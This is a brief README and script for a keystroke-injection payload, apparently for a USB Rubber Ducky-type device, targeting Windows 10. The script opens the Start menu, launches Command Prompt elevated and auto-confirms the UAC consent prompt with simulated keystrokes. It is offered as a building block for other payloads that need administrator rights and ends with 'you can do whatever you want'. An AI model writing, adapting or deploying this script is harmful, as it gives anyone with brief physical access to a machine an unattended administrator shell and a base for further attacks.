# Payload
This simple payload just open a CMD with admin privileges, use it in any payload that need an admin privilege to perform commands.

***

# Code

    REM Opens a CMD as admin on windows 10
    REM Target: Windows 10
    DELAY 1000
    WINDOWS d
    DELAY 100
    WINDOWS
    DELAY 100
    STRING cmd
    DELAY 100
    CONTROL-SHIFT ENTER
    DELAY 150
    LEFTARROW
    DELAY 150
    ENTER
    REM You got an admin CMD, you can do whatever you want


_zqrk_